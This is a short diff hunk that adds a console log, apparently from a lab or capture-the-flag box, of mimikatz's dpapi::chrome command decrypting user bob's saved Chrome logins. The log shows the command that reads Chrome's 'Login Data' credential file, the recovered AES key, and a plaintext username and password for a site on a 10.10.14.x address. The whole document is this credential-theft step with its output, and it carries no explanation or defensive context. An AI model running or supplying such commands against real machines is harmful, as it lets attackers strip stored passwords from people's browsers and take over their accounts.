@@ -1,0 +1,11 @@
+C:\Users\Public> mimikatz.exe
+mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
+> Encrypted Key found in local state file
+> Encrypted Key seems to be protected by DPAPI
+ * using CryptUnprotectData API
+> AES Key is: efefdb353f36e6a9b7a7552cc421393daf867ac28d544e4f6f157e0a698e343c
+
+URL     : http://10.10.14.94/ ( http://10.10.14.94/login.html )
+Username: bob
+ * using BCrypt with AES-256-GCM
+Password: April2025!
